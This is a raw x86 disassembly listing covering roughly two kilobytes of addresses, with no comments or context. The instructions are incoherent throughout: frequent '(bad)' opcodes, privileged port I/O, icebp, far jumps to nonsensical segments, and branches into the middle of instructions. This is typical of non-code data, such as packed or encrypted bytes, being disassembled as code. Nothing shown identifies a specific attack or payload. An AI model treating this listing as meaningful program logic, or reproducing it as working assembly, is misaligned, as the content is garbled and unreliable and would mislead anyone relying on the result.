  4176bd:	or     BYTE PTR [ebp-0x1f],ch
  4176c0:	pop    eax
  4176c1:	repz sti 
  4176c3:	into   
  4176c4:	daa    
  4176c5:	shl    DWORD PTR [ecx+0x4d9d2a09],1
  4176cb:	nop
  4176cc:	xor    dh,BYTE PTR [ebx-0x45]
  4176cf:	call   0xb7a226d1
  4176d4:	in     eax,dx
  4176d5:	sar    esp,0x80
  4176d8:	push   eax
  4176d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176da:	fmul   QWORD PTR [ebx+0x9]
  4176dd:	mov    bh,0x0
  4176df:	sbb    eax,0xe361e0bb
  4176e4:	jle    0x41773f
  4176e6:	inc    edi
  4176e7:	mov    ah,0x1b
  4176e9:	cmp    bl,BYTE PTR [eax-0x31]
  4176ec:	adc    BYTE PTR [edi+0x38],bl
  4176ef:	dec    esi
  4176f0:	cmp    al,0x5a
  4176f2:	test   al,0x4d
  4176f4:	inc    ebx
  4176f5:	out    dx,eax
  4176f6:	dec    ecx
  4176f7:	ins    DWORD PTR es:[edi],dx
  4176f8:	in     al,0x97
  4176fa:	jno    0x4176a6
  4176fc:	in     eax,dx
  4176fd:	fwait
  4176fe:	mov    dh,0x18
  417700:	adc    al,0xe7
  417702:	push   eax
  417703:	outs   dx,DWORD PTR ds:[esi]
  417704:	rcr    BYTE PTR [ebx],0x2e
  417707:	in     al,0x25
  417709:	das    
  41770a:	shr    BYTE PTR [edx-0x7254e2e5],1
  417710:	cs jg  0x417773
  417713:	ja     0x41776a
  417715:	fincstp 
  417717:	dec    edi
  417718:	jnp    0x4176b6
  41771a:	mov    BYTE PTR [ebx+0x8],dl
  41771d:	scas   al,BYTE PTR es:[edi]
  41771e:	aam    0x46
  417720:	repz mov dl,0x75
  417723:	js     0x417702
  417725:	outs   dx,DWORD PTR ds:[esi]
  417726:	xor    edx,ebx
  417728:	and    DWORD PTR ds:0x40d21847,0xffffffe4
  41772f:	and    eax,0x417b5136
  417734:	xor    DWORD PTR [edx+edi*2],ebp
  417737:	popa   
  417738:	icebp  
  417739:	in     eax,dx
  41773a:	fdiv   QWORD PTR [esi+0x65]
  41773d:	push   edx
  41773e:	call   0x1495:0x7933755e
  417745:	or     esp,eax
  417747:	mov    BYTE PTR ds:0x8f26d185,al
  41774d:	(bad)  
  41774e:	ss shl bh,1
  417751:	push   cs
  417752:	ins    DWORD PTR es:[edi],dx
  417753:	or     edx,DWORD PTR [esi-0xd]
  417756:	jmp    0x5c0c:0xc50b07fd
  41775d:	push   esi
  41775e:	ja     0x41775f
  417760:	push   es
  417761:	xor    al,0xae
  417763:	out    dx,al
  417764:	xchg   esp,eax
  417765:	cmp    DWORD PTR [edx],ebp
  417767:	stos   BYTE PTR es:[edi],al
  417768:	mov    ecx,0xbb689f17
  41776d:	xchg   esi,eax
  41776e:	jecxz  0x41778e
  417770:	cmp    al,0x1
  417772:	ds ins BYTE PTR es:[edi],dx
  417774:	jno    0x41772c
  417776:	sbb    bl,BYTE PTR [eax+0x65]
  417779:	jge    0x417722
  41777b:	repnz inc edi
  41777d:	fidiv  DWORD PTR ds:0xeded15a
  417783:	or     bl,BYTE PTR [ebx*4-0x366c6428]
  41778a:	add    BYTE PTR [esi+0x6cea6e1e],ch
  417790:	xlat   BYTE PTR ds:[ebx]
  417791:	add    eax,0xafa8a004
  417796:	shl    DWORD PTR ds:0xf1c806f1,cl
  41779c:	sub    esi,DWORD PTR [edx-0x11]
  41779f:	mov    cl,BYTE PTR [ebx]
  4177a1:	push   cs
  4177a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a3:	pop    ebx
  4177a4:	int3   
  4177a5:	fisub  DWORD PTR [eax]
  4177a7:	adc    edi,DWORD PTR [ecx]
  4177a9:	imul   eax,DWORD PTR [edx],0xffffffc0
  4177ac:	mov    WORD PTR [eax-0x5b],ds
  4177af:	aas    
  4177b0:	jmp    FWORD PTR [ebp+eax*4-0x719acc30]
  4177b7:	mov    edi,0x3259884a
  4177bc:	and    eax,0xb47a9489
  4177c1:	mov    eax,ds:0x3a9cd880
  4177c6:	adc    eax,0x5bcedafc
  4177cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177cc:	push   es
  4177cd:	xchg   BYTE PTR [ebx+0x78],bh
  4177d0:	hlt    
  4177d1:	mov    ebp,0x55a6f4c8
  4177d6:	inc    edx
  4177d7:	cmp    al,BYTE PTR [ebx-0x1435b364]
  4177dd:	add    eax,DWORD PTR [ecx]
  4177df:	mov    ecx,0x301dd90a
  4177e4:	jecxz  0x41780a
  4177e6:	fist   WORD PTR [ebx]
  4177e8:	sub    eax,eax
  4177ea:	clc    
  4177eb:	inc    esi
  4177ec:	dec    ecx
  4177ed:	pop    esi
  4177ee:	xchg   ebp,eax
  4177ef:	mov    WORD PTR cs:[ebp+ecx*8+0x5d799e04],fs
  4177f7:	jae    0x417852
  4177f9:	pop    edx
  4177fa:	add    bl,BYTE PTR [eax+0x51]
  4177fd:	pop    edx
  4177fe:	das    
  4177ff:	test   eax,esp
  417801:	sub    al,0xe3
  417803:	xchg   eax,esp
  417805:	push   ebx
  417806:	cmc    
  417807:	pop    esi
  417808:	xor    esi,DWORD PTR [esp+ebx*4+0x4a]
  41780c:	setno  BYTE PTR [ecx-0x21]
  417810:	daa    
  417811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417812:	leave  
  417813:	push   cs
  417814:	or     ebx,DWORD PTR [ebx-0x7d3ef8cc]
  41781a:	and    al,0xba
  41781c:	mov    esi,0xe9b3ccdc
  417821:	cwde   
  417822:	stos   BYTE PTR es:[edi],al
  417823:	(bad)  
  417824:	push   edi
  417825:	xchg   edi,eax
  417826:	mov    edi,0x56eefe39
  41782b:	ret    0xa3b6
  41782e:	out    0xd6,eax
  417830:	ret    0xe4da
  417833:	retf   0x2c82
  417836:	mov    esi,0x5e5a9bcd
  41783b:	cmp    al,0xd4
  41783d:	or     bl,BYTE PTR [ebp-0x2c61d8e0]
  417843:	jb     0x4178ad
  417845:	add    eax,0x5f1f328c
  41784a:	ds adc ebx,ecx
  41784d:	push   es
  41784e:	mov    edi,0xf2c2b296
  417853:	ficom  DWORD PTR [ebx]
  417855:	and    cl,BYTE PTR [ebp+0x7bc0ef85]
  41785b:	sbb    ebp,DWORD PTR [ebp+eax*1-0x37]
  41785f:	outs   dx,DWORD PTR ds:[esi]
  417860:	jne    0x4178c0
  417862:	add    eax,0x855e8f02
  417867:	arpl   WORD PTR [edi+ebp*4+0x47d15be1],di
  41786e:	dec    eax
  41786f:	fiadd  WORD PTR [edi-0x536f8559]
  417875:	mov    ebp,0xff1c2cc3
  41787a:	scas   eax,DWORD PTR es:[edi]
  41787b:	jno    0x4178c7
  41787d:	xlat   BYTE PTR ds:[ebx]
  41787e:	sub    ecx,DWORD PTR [esi]
  417880:	clc    
  417881:	and    esi,esp
  417883:	push   edx
  417884:	add    dl,bh
  417886:	(bad)  
  417888:	and    dh,bh
  41788a:	fs cmp ah,al
  41788d:	xchg   ecx,eax
  41788e:	ficom  WORD PTR [edx-0x35db9250]
  417894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417895:	dec    edi
  417896:	fst    DWORD PTR [edx]
  417898:	mov    cl,0xb9
  41789a:	add    esi,DWORD PTR [edi-0xc44da62]
  4178a0:	mov    ds:0x698e7d11,eax
  4178a5:	and    dl,BYTE PTR [ebx-0x7b]
  4178a8:	cmc    
  4178a9:	lods   eax,DWORD PTR ds:[esi]
  4178aa:	mov    ds:0xbfc22eea,al
  4178af:	add    eax,0xd77c5249
  4178b4:	test   DWORD PTR [edx+0x34],ebp
  4178b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178b8:	fwait
  4178b9:	xchg   edi,eax
  4178ba:	pop    esi
  4178bb:	stc    
  4178bc:	jmp    0x4178f2
  4178be:	cwde   
  4178bf:	push   esp
  4178c0:	adc    al,0x9f
  4178c2:	xchg   ecx,eax
  4178c3:	xchg   esp,eax
  4178c4:	pop    ss
  4178c5:	out    0xe0,al
  4178c7:	stc    
  4178c8:	ins    DWORD PTR es:[edi],dx
  4178c9:	pop    ds
  4178ca:	jbe    0x41788b
  4178cc:	cdq    
  4178cd:	retf   
  4178ce:	fnstsw WORD PTR [edx]
  4178d0:	pop    eax
  4178d1:	dec    esp
  4178d2:	or     al,BYTE PTR [ebx+0x150420da]
  4178d8:	sub    al,bh
  4178da:	jae    0x417877
  4178dc:	xor    DWORD PTR [edi],edx
  4178de:	cs xchg ecx,eax
  4178e0:	test   DWORD PTR [edi],0x618644e1
  4178e6:	mov    esp,0xcbda9d0b
  4178eb:	pop    esp
  4178ec:	add    BYTE PTR [esi-0x2e],cl
  4178ef:	add    eax,0xc75b27ee
  4178f4:	mov    BYTE PTR [ebx*1-0x7c2e5667],ah
  4178fb:	les    edx,FWORD PTR [ebx]
  4178fd:	fs pop esi
  4178ff:	in     al,0x9
  417901:	clc    
  417902:	adc    DWORD PTR [eax-0x1084b376],edi
  417908:	and    eax,0x8aa95089
  41790d:	adc    DWORD PTR [ebp-0x14b3e5e2],esp
  417913:	inc    ecx
  417914:	sahf   
  417915:	xor    BYTE PTR [edi+0x51],ch
  417918:	or     al,0x4f
  41791a:	inc    esp
  41791b:	xor    cl,ch
  41791d:	pop    ecx
  41791e:	popa   
  41791f:	(bad)  
  417920:	lock inc edi
  417922:	mov    eax,DWORD PTR [eax]
  417924:	imul   eax,DWORD PTR [eax-0x15508a30],0xffffffc1
  41792b:	jl     0x41796d
  41792d:	mov    ah,0x8f
  41792f:	mov    ecx,0x3fa42c6
  417934:	cmp    al,0x9d
  417936:	push   ds
  417937:	cmp    DWORD PTR [ebp+0x5f96b6a6],edx
  41793d:	add    BYTE PTR [eax+0x604a2411],al
  417943:	xchg   esp,eax
  417944:	je     0x41799e
  417946:	add    esp,eax
  417948:	pop    edx
  417949:	addr16 xchg edi,eax
  41794b:	ds and eax,0x6b4a67f2
  417951:	dec    esi
  417952:	fild   WORD PTR [ecx+0x68]
  417955:	pushf  
  417956:	add    eax,0x843c9522
  41795b:	cmp    edi,edi
  41795d:	sub    eax,0xfa3c618c
  417962:	add    edx,edi
  417964:	pushf  
  417965:	imul   ebx,DWORD PTR [ebx+0x26f725e0],0x963e5740
  41796f:	mov    BYTE PTR [eax+0x7ea61456],al
  417975:	pusha  
  417976:	and    DWORD PTR [edx-0x10b8ebd7],esi
  41797c:	mov    dh,0xbd
  41797e:	rcr    DWORD PTR [ecx-0xf],cl
  417981:	add    BYTE PTR [edi],bl
  417983:	push   ebx
  417984:	cmp    DWORD PTR [ebx-0x7d7467a5],edx
  41798a:	leave  
  41798b:	cwde   
  41798c:	push   ebx
  41798d:	in     eax,dx
  41798e:	hlt    
  41798f:	cdq    
  417990:	or     ah,al
  417992:	clc    
  417993:	loope  0x4179df
  417995:	shl    DWORD PTR [esi],0xb4
  417998:	bound  edi,QWORD PTR [esi]
  41799a:	stc    
  41799b:	int    0x28
  41799d:	scas   eax,DWORD PTR es:[edi]
  41799e:	and    DWORD PTR gs:[esp+ebx*1],edx
  4179a2:	retf   0x9c21
  4179a5:	xor    edi,eax
  4179a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179a8:	cmp    edx,ebp
  4179aa:	jg     0x417a13
  4179ac:	test   al,0xb3
  4179ae:	lods   al,BYTE PTR ds:[esi]
  4179af:	add    edi,DWORD PTR [ebx-0x5]
  4179b2:	xlat   BYTE PTR ds:[ebx]
  4179b3:	push   ss
  4179b4:	sub    BYTE PTR [ebx+0xafc21cd],ch
  4179ba:	icebp  
  4179bb:	sti    
  4179bc:	xchg   BYTE PTR [edi+0x13cc2911],bh
  4179c2:	cmp    ecx,DWORD PTR [ebx+0x4222c005]
  4179c8:	jg     0x41798c
  4179ca:	loopne 0x417999
  4179cc:	cmc    
  4179cd:	mov    edx,ebp
  4179cf:	shl    BYTE PTR [ebx],0x6d
  4179d2:	sub    DWORD PTR [edi],esi
  4179d4:	in     eax,dx
  4179d5:	std    
  4179d6:	gs or  al,0x13
  4179d9:	xor    al,0x54
  4179db:	out    dx,eax
  4179dc:	pop    eax
  4179dd:	test   al,0xf7
  4179e0:	gs inc ebp
  4179e2:	xor    DWORD PTR [ecx+0x47],edx
  4179e5:	push   0xc7241e8c
  4179ea:	ret    
  4179eb:	enter  0xb91a,0xb0
  4179ef:	popa   
  4179f0:	dec    esp
  4179f1:	psubd  mm3,QWORD PTR ds:0x626be17f
  4179f8:	mov    ah,0x3e
  4179fa:	mov    bh,0x45
  4179fc:	scas   al,BYTE PTR es:[edi]
  4179fd:	imul   edx,DWORD PTR [esi-0x48],0xc4891c7d
  417a04:	push   es
  417a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a06:	shl    BYTE PTR [esi+0x60efe31f],1
  417a0c:	pop    edx
  417a0d:	jmp    0xacf3:0xd638106b
  417a14:	jge    0x4179a5
  417a16:	aad    0xdd
  417a18:	push   ebp
  417a19:	or     DWORD PTR ds:0xaabf630a,ebx
  417a1f:	repz es push esp
  417a22:	mov    esp,ecx
  417a24:	inc    ecx
  417a25:	mov    ecx,0xd577a8ac
  417a2a:	retf   
  417a2b:	mov    eax,ds:0x49e2f794
  417a30:	out    dx,eax
  417a31:	pop    edi
  417a32:	and    eax,0xf15dabee
  417a37:	jbe    0x4179bc
  417a39:	jecxz  0x417aa4
  417a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a3c:	stos   DWORD PTR es:[edi],eax
  417a3d:	adc    ebp,ecx
  417a3f:	dec    ecx
  417a40:	adc    DWORD PTR [esi+0x54],esp
  417a43:	cmc    
  417a44:	sbb    al,BYTE PTR [edi]
  417a46:	pop    ds
  417a47:	mov    ss,WORD PTR [ebp+eiz*8-0x1472e507]
  417a4e:	xchg   ebp,eax
  417a4f:	pop    ebx
  417a50:	push   esi
  417a51:	mov    dh,0x26
  417a53:	xchg   edi,eax
  417a54:	dec    edi
  417a55:	add    ah,BYTE PTR [ecx-0x29]
  417a58:	and    cl,BYTE PTR [ecx+0x34]
  417a5b:	or     ah,BYTE PTR [ebp-0x16b44cad]
  417a61:	xlat   BYTE PTR ds:[ebx]
  417a62:	(bad)
  417a65:	lods   al,BYTE PTR ds:[esi]
  417a66:	push   ebx
  417a67:	jno    0x417a91
  417a69:	xlat   BYTE PTR ds:[ebx]
  417a6a:	dec    edx
  417a6b:	cld    
  417a6c:	mov    ds:0xeccb2508,al
  417a71:	sub    ebp,esi
  417a73:	jo     0x417a25
  417a75:	bndldx bnd1,[edx-0xa539da8]
  417a7c:	jle    0x417a82
  417a7e:	stos   DWORD PTR es:[edi],eax
  417a7f:	mov    ch,0xb4
  417a81:	test   eax,0xc0632257
  417a86:	mov    esi,0x2ccceb06
  417a8b:	pop    ss
  417a8c:	mov    bl,0x7a
  417a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8f:	push   cs
  417a90:	push   0x51
  417a92:	push   esi
  417a93:	mov    eax,fs
  417a95:	add    bl,BYTE PTR [eax-0x23]
  417a98:	shr    BYTE PTR [ebx],1
  417a9a:	mov    eax,ds:0x577dae5a
  417a9f:	jb     0x417aed
  417aa1:	(bad)  
  417aa2:	fild   DWORD PTR [ecx-0x13]
  417aa5:	sub    al,0xa0
  417aa7:	stc    
  417aa8:	xchg   esi,eax
  417aa9:	dec    ax
  417aab:	add    al,0xa5
  417aad:	cmp    al,0x82
  417aaf:	fld    QWORD PTR [edi]
  417ab1:	call   0x79ed4735
  417ab6:	mov    ch,0xd8
  417ab8:	cmp    edi,DWORD PTR [eax-0xf]
  417abb:	out    0xe0,al
  417abd:	in     eax,dx
  417abe:	lahf   
  417abf:	out    dx,al
  417ac0:	pop    es
  417ac1:	int    0xc0
  417ac3:	mov    eax,ds:0xb7d2991b
  417ac8:	sub    dh,BYTE PTR [eax+0x17]
  417acb:	push   edx
  417acc:	pop    ds
  417acd:	daa    
  417ace:	mov    al,ds:0x11090da8
  417ad3:	aad    0x75
  417ad5:	push   ebp
  417ad6:	(bad)
  417ada:	mov    eax,ds:0x6b341ba3
  417adf:	out    0x86,al
  417ae1:	cld    
  417ae2:	(bad)  
  417ae3:	sti    
  417ae4:	cmc    
  417ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ae6:	aas    
  417ae7:	cmc    
  417ae8:	cmp    al,0x63
  417aea:	or     eax,0xfa5bf1bb
  417aef:	mov    fs,ecx
  417af1:	loop   0x417b5a
  417af3:	shl    BYTE PTR [esi+esi*1+0x5ed1b3a5],0xcf
  417afb:	mov    cl,0xb0
  417afd:	out    0xa8,al
  417aff:	jnp    0x417aaa
  417b01:	fst    DWORD PTR [eax]
  417b03:	mov    al,0xfe
  417b05:	jmp    0x99d8cdd
  417b0a:	sti    
  417b0b:	inc    ecx
  417b0c:	sub    BYTE PTR fs:[eax-0x7f],ah
  417b10:	loop   0x417b12
  417b12:	add    ch,BYTE PTR [ecx+0x38fbbb33]
  417b18:	mov    ch,0x13
  417b1a:	inc    eax
  417b1b:	rcl    BYTE PTR [eax],0x34
  417b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1f:	push   cs
  417b20:	es test esp,eax
  417b23:	arpl   WORD PTR [esi-0x749a46a9],di
  417b29:	sbb    BYTE PTR [ebp-0x3d8e0851],0xfd
  417b30:	repnz imul edi
  417b33:	push   edx
  417b34:	pop    edi
  417b35:	je     0x417acf
  417b37:	(bad)  ds:0x911a168b
  417b3d:	dec    ecx
  417b3e:	fxch   st(3)
  417b40:	add    DWORD PTR [ecx-0x6eeefce4],ebp
  417b46:	push   esp
  417b47:	shl    DWORD PTR [ebp+0x104d53dc],0x6e
  417b4e:	into   
  417b4f:	lea    edi,[ebx]
  417b51:	jecxz  0x417ade
  417b53:	jne    0x417b55
  417b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b56:	mov    cl,0xa7
  417b58:	pop    edx
  417b59:	jle    0x417b74
  417b5b:	std    
  417b5c:	pop    DWORD PTR [eax+edi*1-0x45]
  417b60:	add    al,0x1
  417b62:	and    ch,bh
  417b64:	ins    DWORD PTR es:[edi],dx
  417b65:	gs scas eax,DWORD PTR es:[edi]
  417b67:	stos   BYTE PTR es:[edi],al
  417b68:	inc    esp
  417b69:	ret    0xf08e
  417b6c:	ja     0x417b5b
  417b6e:	push   edx
  417b6f:	cmp    eax,0x87e09f63
  417b74:	js     0x417b7d
  417b76:	addr16 clc 
  417b78:	jp     0x417b1f
  417b7a:	and    al,0x29
  417b7c:	push   ebx
  417b7d:	jmp    0xfd00f65e
  417b82:	cli    
  417b83:	nop
  417b84:	stos   DWORD PTR es:[edi],eax
  417b85:	pop    es
  417b86:	les    ebp,FWORD PTR [esi-0x7c]
  417b89:	in     al,dx
  417b8a:	jmp    0xc6a5b815
  417b8f:	sub    BYTE PTR [esi],cl
  417b91:	mov    cl,0xaa
  417b93:	aas    
  417b94:	popf   
  417b95:	int    0x74
  417b97:	test   ebx,esp
  417b99:	inc    bx
  417b9b:	inc    edx
  417b9c:	aam    0xb9
  417b9e:	(bad)  
  417b9f:	or     al,0xb5
  417ba1:	mov    DWORD PTR [edx-0x66b01ebc],0xdf7fd22f
  417bab:	je     0x417bc9
  417bad:	mov    esp,0x8867133
  417bb2:	or     eax,0x57753844
  417bb7:	pushf  
  417bb8:	clc    
  417bb9:	dec    ecx
  417bba:	shl    edi,cl
  417bbc:	mov    WORD PTR [ebp-0x12500b06],?
  417bc2:	dec    edx
  417bc3:	daa    
  417bc4:	or     DWORD PTR [ebx],edi
  417bc6:	adc    edx,DWORD PTR [eax+0x2]
  417bc9:	mov    ebx,0x4b859f7
  417bce:	xchg   ebp,eax
  417bcf:	not    BYTE PTR [ebp+0x5d9aa092]
  417bd5:	stos   BYTE PTR es:[edi],al
  417bd6:	adc    DWORD PTR [eax+0x6a3de32],esp
  417bdc:	inc    eax
  417bdd:	inc    ebp
  417bde:	hlt    
  417bdf:	aaa    
  417be0:	dec    esp
  417be1:	fld    DWORD PTR [ebp-0x53248e32]
  417be7:	int    0xe4
  417be9:	adc    BYTE PTR [eax],0x23
  417bec:	xchg   edi,eax
  417bed:	push   cs
  417bee:	mov    BYTE PTR [edx+0x4071aaed],0x2
  417bf5:	dec    ebp
  417bf6:	inc    edi
  417bf7:	stos   BYTE PTR es:[edi],al
  417bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf9:	jl     0x417bf5
  417bfb:	xor    eax,0xb1419ca4
  417c00:	inc    esp
  417c01:	sbb    al,0x79
  417c03:	jmp    0x417bff
  417c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c06:	(bad)  
  417c07:	mov    al,ds:0x4c07037d
  417c0c:	add    al,0xce
  417c0e:	mov    eax,0x208cd5c7
  417c13:	mov    bl,0x8e
  417c15:	fmul   DWORD PTR [eax-0x36]
  417c18:	pushf  
  417c19:	or     DWORD PTR [edi],esi
  417c1b:	mov    eax,0x7ff06e9
  417c20:	xchg   BYTE PTR [eax-0x4e],dh
  417c23:	pop    ss
  417c24:	loope  0x417bc2
  417c26:	ins    BYTE PTR es:[edi],dx
  417c27:	jl     0x417bca
  417c29:	int    0x5
  417c2b:	repnz adc eax,0xa0598279
  417c31:	mov    al,ds:0x9c774a5f
  417c36:	cmp    eax,0xf7ce8baf
  417c3b:	mov    bh,0xff
  417c3d:	mov    edi,0x97daa0bc
  417c42:	lods   eax,DWORD PTR ds:[esi]
  417c43:	int3   
  417c44:	out    0x86,al
  417c46:	inc    edi
  417c47:	pop    esi
  417c48:	xchg   ebp,eax
  417c49:	ds into 
  417c4b:	or     eax,0xb65bf194
  417c50:	sti    
  417c51:	push   eax
  417c52:	mov    ds:0x3b374563,al
  417c57:	push   ebp
  417c58:	ds mov esi,ecx
  417c5b:	or     al,0x65
  417c5d:	ins    BYTE PTR es:[edi],dx
  417c5e:	arpl   cx,ax
  417c60:	out    dx,al
  417c61:	jne    0x417c86
  417c63:	outs   dx,BYTE PTR ds:[esi]
  417c64:	sbb    eax,0xf1f44730
  417c69:	dec    edi
  417c6a:	sbb    BYTE PTR [ecx+0x6d969432],cl
  417c70:	or     al,0xf2
  417c72:	cdq    
  417c73:	das    
  417c74:	inc    esi
  417c75:	mov    esi,0x2fa9a931
  417c7a:	scas   eax,DWORD PTR es:[edi]
  417c7b:	mov    al,0xa1
  417c7d:	fwait
  417c7e:	icebp  
  417c7f:	inc    edi
  417c80:	push   esi
  417c81:	mov    bh,0xec
  417c83:	in     al,0xec
  417c85:	test   eax,0x3903135e
  417c8a:	cwde   
  417c8b:	daa    
  417c8c:	not    dl
  417c8e:	test   al,0x1c
  417c90:	dec    esi
  417c91:	test   DWORD PTR [esi+ebp*4+0x15cbf4df],ebx
  417c98:	(bad)  
  417c99:	in     eax,dx
  417c9a:	call   0x1400c674
  417c9f:	sub    DWORD PTR [ebp+ebx*8-0x1ebade9e],0x5
  417ca7:	and    DWORD PTR [esi-0x3e7e1077],esi
  417cad:	jae    0x417cb4
  417caf:	xor    eax,0xd3ea8819
  417cb4:	sub    ah,dl
  417cb6:	out    0x67,eax
  417cb8:	(bad)  
  417cb9:	mov    ds:0x4c401140,eax
  417cbe:	pop    esi
  417cbf:	jbe    0x417ccb
  417cc1:	in     al,dx
  417cc2:	add    ch,dh
  417cc4:	mov    bh,0x42
  417cc6:	xchg   ecx,eax
  417cc7:	sbb    eax,0x1a6e4f71
  417ccc:	cmp    DWORD PTR [esi-0x7d50d79a],esp
  417cd2:	xchg   edi,eax
  417cd3:	int3   
  417cd4:	outs   dx,BYTE PTR ds:[esi]
  417cd5:	pusha  
  417cd6:	in     al,0x2a
  417cd8:	mov    DWORD PTR [esi-0x46],esi
  417cdb:	pop    edx
  417cdc:	enter  0xcb61,0xb3
  417ce0:	mov    ss,esp
  417ce2:	clc    
  417ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce4:	scas   eax,DWORD PTR es:[edi]
  417ce5:	shl    eax,0x49
  417ce8:	test   DWORD PTR [ebx+0xd],ebp
  417ceb:	jne    0x417cb2
  417ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cee:	(bad)  
  417cef:	mov    dh,0x55
  417cf1:	jmp    0x417cb3
  417cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cf4:	test   ah,0x3b
  417cf7:	jnp    0x417cf3
  417cf9:	push   esi
  417cfa:	cwde   
  417cfb:	xor    dl,BYTE PTR [esi+0x5e]
  417cfe:	or     BYTE PTR [esi],ch
  417d00:	sub    al,BYTE PTR [eax-0x65]
  417d03:	(bad)  
  417d04:	cmc    
  417d05:	mov    bh,0x9c
  417d07:	pop    es
  417d08:	push   ss
  417d09:	xor    DWORD PTR gs:[edi],0xfffffff3
  417d0d:	inc    ebp
  417d0e:	ins    DWORD PTR es:[edi],dx
  417d0f:	push   esi
  417d10:	dec    eax
  417d11:	xchg   esi,eax
  417d12:	lock ins BYTE PTR es:[edi],dx
  417d14:	xchg   esi,eax
  417d15:	repz sub DWORD PTR [edx+0x5fe5bb47],0x47
  417d1d:	sub    DWORD PTR ds:0xe67eb8d9,ecx
  417d23:	push   ebp
  417d24:	(bad)  
  417d25:	int3   
  417d26:	popf   
  417d27:	cdq    
  417d28:	mov    cl,0xfa
  417d2a:	(bad)  
  417d2b:	push   esi
  417d2c:	stos   BYTE PTR es:[edi],al
  417d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2e:	in     al,dx
  417d2f:	int3   
  417d30:	adc    al,0x10
  417d32:	data16 sbb dh,BYTE PTR [ebp+0x5a]
  417d36:	ror    DWORD PTR [esi],0xb6
  417d39:	sub    al,0xff
  417d3b:	pop    esi
  417d3c:	popf   
  417d3d:	loop   0x417d3c
  417d3f:	sti    
  417d40:	add    eax,0x451c390c
  417d45:	or     ch,cl
  417d47:	repnz push ecx
  417d49:	retf   
  417d4a:	jp     0x417d10
  417d4c:	add    BYTE PTR [ebp+0x15501c50],ch
  417d52:	scas   al,BYTE PTR es:[edi]
  417d53:	xchg   edi,eax
  417d54:	scas   eax,DWORD PTR es:[edi]
  417d55:	pop    eax
  417d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d57:	sbb    DWORD PTR [edx],0x59
  417d5a:	(bad)  
  417d5b:	dec    esp
  417d5c:	jo     0x417dc3
  417d5e:	lock inc esi
  417d60:	cwde   
  417d61:	mov    dh,0x66
  417d63:	js     0x417d72
  417d65:	mov    al,ds:0xcc9b018f
  417d6a:	and    ebp,DWORD PTR [eax+0x7f]
  417d6d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d6f:	or     BYTE PTR [ebx-0x7b],0x28
  417d73:	lea    edx,[esi+0x6774f2b4]
  417d79:	pop    eax
  417d7a:	neg    BYTE PTR [ecx-0x23be99ca]
  417d80:	inc    eax
  417d81:	outs   dx,DWORD PTR ds:[esi]
  417d82:	adc    eax,0xc5ab5239
  417d87:	into   
  417d88:	mov    esi,0x11a33dc6
  417d8d:	iret   
  417d8e:	bound  edi,QWORD PTR [ecx+0x48]
  417d91:	inc    eax
  417d92:	add    edx,DWORD PTR [esi-0x6e]
  417d95:	ins    DWORD PTR es:[edi],dx
  417d96:	ret    0x107a
  417d99:	mov    eax,ds:0x8033ca5f
  417d9e:	pop    es
  417d9f:	dec    ecx
  417da0:	aad    0x70
  417da2:	sub    eax,0xb224138f
  417da7:	icebp  
  417da8:	call   0xff4bd3d7
  417dad:	mov    ah,0x6b
  417daf:	ret    
  417db0:	sar    BYTE PTR [eax+ebx*1+0x73793e8a],1
  417db7:	retf   0x7298
  417dba:	scas   al,BYTE PTR es:[edi]
  417dbb:	mov    dl,al
  417dbd:	nop
  417dbe:	jns    0x417d42
  417dc0:	pop    ebp
  417dc1:	std    
  417dc2:	stos   BYTE PTR es:[edi],al
  417dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dc4:	mov    edx,0x7542af8
  417dc9:	sub    DWORD PTR [ebp-0x660a8340],ebx
  417dcf:	in     eax,0x69
  417dd1:	lahf   
  417dd2:	jae    0x417e4f
  417dd4:	jge    0x417df1
  417dd6:	or     BYTE PTR [eax+0x5a],0xad
  417dda:	jecxz  0x417e58
  417ddc:	arpl   si,di
  417dde:	jmp    0x711bb63
  417de3:	jno    0x417e2f
  417de5:	adc    eax,0x81e7cfe2
  417dea:	xchg   ebx,eax
  417deb:	lods   eax,DWORD PTR ds:[esi]
  417dec:	push   ebx
  417ded:	and    BYTE PTR [eax+0x70],ch
  417df0:	inc    edi
  417df1:	cmp    al,0xcd
  417df3:	std    
  417df4:	push   esp
  417df5:	into   
  417df6:	inc    ebx
  417df7:	mov    al,0x7
  417df9:	in     al,0x11
  417dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dfc:	mov    ds:0x2c371d21,al
  417e01:	sbb    edx,esi
  417e03:	adc    al,BYTE PTR [ecx-0x57cab212]
  417e09:	adc    DWORD PTR [ebp+0x3b],esp
  417e0c:	outs   dx,BYTE PTR ds:[esi]
  417e0d:	push   ds
  417e0e:	xchg   ebx,eax
  417e0f:	sbb    eax,0x74b4c8f1
  417e14:	add    ecx,esi
  417e16:	dec    edx
  417e17:	xor    eax,0xbb29922b
  417e1c:	mov    dl,0xee
  417e1e:	sub    eax,0xdbf926dc
  417e23:	icebp  
  417e24:	xor    ah,BYTE PTR [esi]
  417e26:	dec    ebp
  417e27:	retf   
  417e28:	icebp  
  417e29:	sbb    eax,DWORD PTR [eax+0x2df1ffe9]
